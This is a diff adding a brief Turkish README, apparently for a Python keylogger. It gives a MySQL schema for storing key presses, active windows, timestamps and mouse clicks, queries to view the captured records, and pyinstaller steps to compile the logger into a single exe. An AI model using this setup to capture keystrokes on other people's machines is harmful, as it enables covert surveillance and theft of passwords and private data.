@@ -1,0 +1,29 @@
+ilk olarak mysql'de databaseimizi oluşturuyoruz
+
+daha sonrasında bilgileri çekmek için bir tablo ve tablo içine hangi tuşa ve ne zaman basıldığına bakmak için gerekli kodlarımızı ekliyoruz
+
+"CREATE TABLE pyloggersz (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+	active_window VARCHAR(255) NOT NULL DEFAULT '',
+    key_press VARCHAR(255) NULL,	
+    press_time TIMESTAMP NOT NULL DEFAULT NOW(),       
+    mouse_x INT NULL,
+    mouse_y INT NULL,
+    event_type VARCHAR(10) NULL,   
+	click VARCHAR(255) NULL,
+	active_window_click VARCHAR(255) NOT NULL DEFAULT ''    
+)"
+
+
+DATABASE üzerinden tablomuzu görmek için gerekli kodu buraya ekliyorum.
+"use pyloggersz;
+show tables;
+SELECT * FROM pyloggersz;"
+
+
+
+Python kodumuzu exe dosyasına dönüştürmek için "pyinstaller" aracı kullanıyoruz. Öncelikle, "pyinstaller" paketini kurmamız gerekir
+Bu, pip kullanarak yapılabilir: "pip install pyinstaller" komutu ile kurulumu gerçekleştirebiliriz.
+Daha sonra, komut satırına giderek ve kodunuzun bulunduğu dizine geçtikten sonra, aşağıdaki komutu çalıştırıyoruz:
+pyinstaller -F finalloggerz.py
+Bu komut, "finalloggerz.py" dosyasını tek dosya halinde bir exe dosyasına dönüştürür. Oluşan exe dosyasını, "dist" klasörünün içinde bulabilirsiniz.
